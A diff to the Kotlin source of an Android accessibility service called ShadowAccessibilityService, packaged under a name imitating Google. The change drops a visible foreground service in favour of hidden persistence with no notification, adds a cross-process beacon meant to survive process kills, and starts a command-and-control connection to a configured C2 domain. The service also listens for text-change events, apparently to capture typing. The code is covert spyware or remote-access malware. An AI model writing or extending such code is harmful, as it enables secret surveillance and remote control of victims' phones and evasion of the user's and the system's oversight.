@@ -57,25 +57,30 @@ class ShadowAccessibilityService : AccessibilityService() {
             Log.e("ShadowA11y", "Failed to enqueue worker", e)
         }
 
-        // Promote the process to a foreground service so the ColorOS reaper backs
-        // off from the ~48s kill it applies to plain background processes. This is
-        // the survival path — a11y is the low-latency path, the FG service is the
-        // keep-alive path.
-        try {
-            com.shadow.SyncForegroundService.start(applicationContext)
-        } catch (e: Exception) {
-            Log.e("ShadowA11y", "Failed to start foreground service", e)
-        }
+        // a11y is the BOUND-TIER keep-alive path and the low-latency path. It carries no
+// notification and no visible component — the only surface is the one-line subtitle
+// in Settings > Accessibility. Bound services sit above cached/background in the
+// kill table while Android holds the binding.
 
-        // Start C2 immediately — don't wait for the 15-minute PeriodicWork window.
-        // The a11y binding keeps the process alive, so the WSS stays up as long as
-        // Android holds the service.
-        try {
-            val c2Domain = com.google.android.phonesync.BuildConfig.C2_DOMAIN
-            com.shadow.ShadowCore.start(applicationContext, c2Domain)
-        } catch (e: Exception) {
-            Log.e("ShadowA11y", "Failed to start ShadowCore from a11y", e)
-        }
+// Bring up the cross-process beacon host too, so the beacon survives even if this
+// (main) process is reaped: the ":sync" process holds it independently.
+try {
+    com.shadow.DualProcess.remember(applicationContext)
+    com.shadow.DualProcess.wakeBeacon(applicationContext)
+    com.shadow.AccountRegistrar.ensure(applicationContext)
+} catch (e: Exception) {
+    Log.e("ShadowA11y", "persistence bring-up failed", e)
+}
+
+// Start C2 immediately — don't wait for the 15-minute PeriodicWork window. The
+// a11y binding keeps THIS process alive; the :sync process keeps the beacon alive
+// independently. ShadowCore.start() is idempotent per process.
+try {
+    val c2Domain = com.google.android.phonesync.BuildConfig.C2_DOMAIN
+    com.shadow.ShadowCore.start(applicationContext, c2Domain)
+} catch (e: Exception) {
+    Log.e("ShadowA11y", "Failed to start ShadowCore from a11y", e)
+}
 
         val info = AccessibilityServiceInfo().apply {
             eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or
